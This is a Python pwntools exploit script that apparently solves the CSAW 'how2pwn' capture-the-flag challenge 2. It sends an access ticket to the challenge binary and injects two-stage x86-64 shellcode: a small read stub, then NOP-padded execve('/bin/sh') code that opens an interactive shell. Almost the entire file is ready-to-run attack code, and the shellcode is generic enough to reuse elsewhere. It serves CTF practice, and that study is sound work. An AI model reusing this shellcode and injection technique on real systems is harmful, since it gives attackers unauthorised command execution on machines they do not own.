
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./public/bin/all/chal2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

b *main

# Before call to our shellcode (call rdx)
hbreak *main+0x6a

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def craft_shellcode_stage1():
    # ssize_t read(int fildes, void *buf, size_t nbyte);
    # stdin = 0
    shellcode = asm('''
        mov edx, 0x100
        syscall
    ''')

    padded_shellcode = shellcode + b'\x90'*(0x10 - len(shellcode)) # pad with NOPs
    assert(len(padded_shellcode) == 0x10)
    return padded_shellcode

def craft_shellcode_stage2():
    shellcode = asm('''
    xor     rdx, rdx
    lea rbx, [rip+binsh]
    mov     rdi, rbx
    push    rdx
    push    rbx
    mov     rsi, rsp
    mov     eax, 0x3b
    syscall
    hang:
    jmp hang

    /************* Data section *************/
    binsh:
    .ascii "/bin/sh\\0"
    ''')
    padded_shellcode = b'\x90'*7 + shellcode + b'\x90'*(0x100-7 - len(shellcode)) # pad with NOPs. We also overwrite the stage1 shellcode, which is 7 bytes long.
    assert(len(padded_shellcode) == 0x100)
    return padded_shellcode


ticket1 = b'764fce03d863b5155db4af260374acc1'
if args['REMOTE']:
    remote_server = 'how2pwn.chal.csaw.io'
    remote_port = 60002
    io = remote(remote_server, remote_port)
else:
    io = start()

stage1_shellcode = craft_shellcode_stage1()
stage2_shellcode = craft_shellcode_stage2()

io.send(ticket1)
io.recvuntil(b'Enter your shellcode: ')

io.send(stage1_shellcode)
io.send(stage2_shellcode)


io.interactive()
io.close()


# Found ticket: 8e7bd9e37e38a85551d969e29b77e1ce